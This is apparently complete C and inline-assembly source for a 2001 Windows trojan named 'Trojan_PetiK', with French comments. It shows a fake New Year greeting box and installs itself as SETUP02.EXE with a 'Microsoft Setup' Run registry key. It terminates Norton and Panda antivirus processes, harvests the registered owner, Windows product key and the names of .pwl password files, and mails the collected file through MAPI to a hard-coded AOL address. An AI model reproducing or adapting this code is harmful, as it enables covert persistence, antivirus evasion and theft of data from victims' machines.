/*
Début : 12 décembre 2001
Fin : 29 décembre 2001

Modifications : 13 janvier 2002

*/
#include <windows.h>
#include <tlhelp32.h>
#include <mapi.h>
#pragma argused
#pragma inline

// Install Trojan
char filename[100], sysdir[100], sysdr[100], liste[50], pwl[50];
HKEY hReg;
LPSTR Run = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";

// Fuck antivirus
HANDLE lSnapshot,myproc;
BOOL rProcessFound;

// Prend des informations
BYTE owner[100],org[100],key[30],id[30],ver[30];
BYTE page[150];
DWORD sizowner=sizeof(owner),sizorg=sizeof(org),sizkey=sizeof(key),sizid=sizeof(id);
DWORD sizver=sizeof(ver),sizpage=sizeof(page),type=REG_SZ;
LPSTR CurVer="Software\\Microsoft\\Windows\\CurrentVersion",Main="Software\\Microsoft\\Internet Explorer\\Main";

// Envoie les infos


PROCESSENTRY32 uProcess;
WIN32_FIND_DATA Search;

void Bienvenue();
void StopDetect();
void Information();
void SendInfo();

ULONG (PASCAL FAR *RegSerPro)(ULONG, ULONG);


int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow)
{
HMODULE k32=GetModuleHandle("KERNEL32.DLL");
if(k32) {
    (FARPROC &)RegSerPro=GetProcAddress(k32,"RegisterServiceProcess");
    if(RegSerPro)
    RegSerPro(NULL,1);
    }

// Install trojan
GetModuleFileName(hInst,filename,100);
GetSystemDirectory((char *)sysdir,100);
strcpy(sysdr,sysdir);
strcat(sysdir,"\\SETUP02.EXE");
if ((lstrcmp(filename,sysdir))!=0) {
Bienvenue();
}
else
{
SendInfo();
}
strcat(sysdr,"\\Setup02.exe");
CopyFile(filename,sysdr,0);
RegOpenKeyEx(HKEY_LOCAL_MACHINE,Run,0,KEY_WRITE,&hReg);
RegSetValueEx(hReg,"Microsoft Setup",0,REG_SZ, (BYTE *)sysdr, 100);
RegCloseKey(hReg);
StopDetect();
Information();

}


void StopDetect()
{
register BOOL term;
lSnapshot=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
uProcess.dwSize=sizeof(uProcess);
rProcessFound=Process32First(lSnapshot,&uProcess);
while(rProcessFound) {
    if(strstr(uProcess.szExeFile,"NAVAPW32.EXE")!=NULL) {   // Norton Antivirus
        myproc=OpenProcess(PROCESS_ALL_ACCESS,FALSE,uProcess.th32ProcessID);
        if(myproc!=NULL) {
            term=TerminateProcess(myproc,0);
        }
        CloseHandle(myproc);
    }
    if(strstr(uProcess.szExeFile,"PAVSCHED.EXE")!=NULL) {   // Panda Antivirus
        myproc=OpenProcess(PROCESS_ALL_ACCESS,FALSE,uProcess.th32ProcessID);
        if(myproc!=NULL) {
            term=TerminateProcess(myproc,0);
        }
        CloseHandle(myproc);
    }
    rProcessFound=Process32Next(lSnapshot,&uProcess);
}
CloseHandle(lSnapshot);
}

void Information()
{
register bool abc=TRUE;
register HANDLE hFile;
GetSystemDirectory((char *)liste,50);
strcat(liste,"\\liste_troj.txt");
RegOpenKeyEx(HKEY_LOCAL_MACHINE,CurVer,0,KEY_QUERY_VALUE,&hReg);
RegQueryValueEx(hReg,"RegisteredOwner",0,&type,owner,&sizowner);
RegQueryValueEx(hReg,"RegisteredOrganization",0,&type,org,&sizorg);
RegQueryValueEx(hReg,"ProductKey",0,&type,key,&sizkey);
RegQueryValueEx(hReg,"ProductId",0,&type,id,&sizid);
RegQueryValueEx(hReg,"Version",0,&type,ver,&sizver);
RegCloseKey(hReg);
RegOpenKeyEx(HKEY_CURRENT_USER,Main,0,KEY_QUERY_VALUE,&hReg);
RegQueryValueEx(hReg,"Start Page",0,&type,page,&sizpage);
RegCloseKey(hReg);
WritePrivateProfileString("Info Ordi","Owner",owner,liste);
WritePrivateProfileString("Info Ordi","Organization",org,liste);
WritePrivateProfileString("Info Ordi","ProductKey",key,liste);
WritePrivateProfileString("Info Ordi","ProductId",id,liste);
WritePrivateProfileString("Info Ordi","Version",ver,liste);
WritePrivateProfileString("Info Internet","Page Internet",page,liste);
GetWindowsDirectory((char *)pwl,50);
SetCurrentDirectory(pwl);
hFile=FindFirstFile("*.pwl",&Search);
if(hFile!=INVALID_HANDLE_VALUE) {
    while(abc) {
        WritePrivateProfileString("Info Pass",Search.cFileName,pwl,liste);
        abc=FindNextFile(hFile,&Search);
    }
}
FindClose(hFile);
}

void SendInfo()
{
_asm
{
DebutAsm:
    push    50
    push    offset liste
    call    GetSystemDirectoryA
    call    @liste
    db  "\liste_troj.txt",0
@liste: push    offset liste
    call    lstrcat

    call    @wininetdll
    db  "WININET.DLL",0
    @wininetdll:
    call    LoadLibrary
    test    eax,eax
    jz  send
    mov ebp,eax
    call    @inetconnect
    db  "InternetGetConnectedState",0
    @inetconnect:
    push    ebp
    call    GetProcAddress
    test    eax,eax
    jz  End
    mov edi,eax
verif:  push    00h
    push    offset Tmp
    call    edi
    dec eax
    jnz verif
    push    ebp
    call    FreeLibrary
    

send:   call    @mapidll
    db  "MAPI32.DLL",0
    @mapidll:
    call    LoadLibrary
    test    eax,eax
    jz  End
    mov ebp,eax
    call    @sendmail
    db  "MAPISendMail",0
    @sendmail:
    push    ebp
    call    GetProcAddress
    test    eax,eax
    jz  End
    mov edi,eax

    xor eax,eax
    push    eax
    push    eax
    push    offset Message
    push    eax
    push    [MsgHdl]
    call    edi

    push    5000
    call    Sleep

    push    ebp
    call    FreeLibrary

End:    jmp FinAsm

liste       db 50 dup (0)
Tmp     dd 0
MsgHdl      dd 0
petikmail   db "Pentasm99@aol.com",0
subject     db "Trojan_PetiK, OUVRE-VITE PETIK",0
body        db "Encors un con ki s'est fait prendre",0dh,0ah
        db "Tant pis pour lui. Je peux tout voir.",0dh,0ah,0dh,0ah,0dh,0ah
        db 9,9,"PetiKVX (www.petikvx.fr.fm)",0


Message dd ?
    dd offset subject
    dd offset body
    dd ?
    dd ?
    dd ?
    dd 2
    dd offset MsgFrom
    dd 1
    dd offset MsgTo
    dd 1
    dd offset Attach

MsgFrom dd ?
    dd ?
    dd ?
    dd ?
    dd ?
    dd ?

MsgTo   dd ?
    dd 1
    dd offset petikmail
    dd offset petikmail
    dd ?
    dd ?

Attach  dd ?
    dd ?
    dd ?
    dd offset liste
    dd ?
    dd ?

FinAsm:
}
RegOpenKeyEx(HKEY_LOCAL_MACHINE,Run,0,KEY_ALL_ACCESS,&hReg);
RegDeleteValue(hReg,"Microsoft Setup");
RegCloseKey(hReg);
}

void Bienvenue()
{
MessageBox(NULL,"Je te souhaite une Bonne et Heureuse Nouvelle Année.\nEt tous mes meilleurs voeux.",
            "BONNE ANNEE !",MB_OK|MB_ICONINFORMATION);
}
